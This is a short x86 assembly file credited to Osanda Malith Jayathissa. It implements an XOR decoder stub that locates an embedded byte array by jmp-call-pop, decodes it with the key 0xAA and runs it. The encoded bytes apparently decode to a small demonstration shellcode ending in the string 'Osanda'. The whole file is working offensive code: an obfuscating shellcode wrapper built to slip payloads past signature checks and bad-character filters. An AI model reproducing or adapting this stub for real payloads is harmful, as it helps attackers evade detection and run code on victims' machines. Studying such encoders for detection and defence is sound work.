; Author: Osanda Malith Jayathissa (@OsandaMalith)
; This is the XOR decoder stub

section .text
  global _start		

_start:

	jmp short call_decoder

decoder:
	pop esi


decode:
	xor byte [esi], 0xAA
	jz Shellcode
	inc esi
	jmp short decode


call_decoder:

	call decoder
	Shellcode: db 0x41,0xb3,0x9b,0x6a,0x9b,0x71,0x9b,0x78,0x9b,0x63,0x1a,0x8d,0xf1,0xcc,0x13,0x47,0xab,0x67,0x2a,0x9b,0x6a,0x1a,0xab,0x9b,0x71,0x67,0x2a,0x42,0x48,0x55,0x55,0x55,0xe5,0xd9,0xcb,0xc4,0xce,0xcb, 0xaa
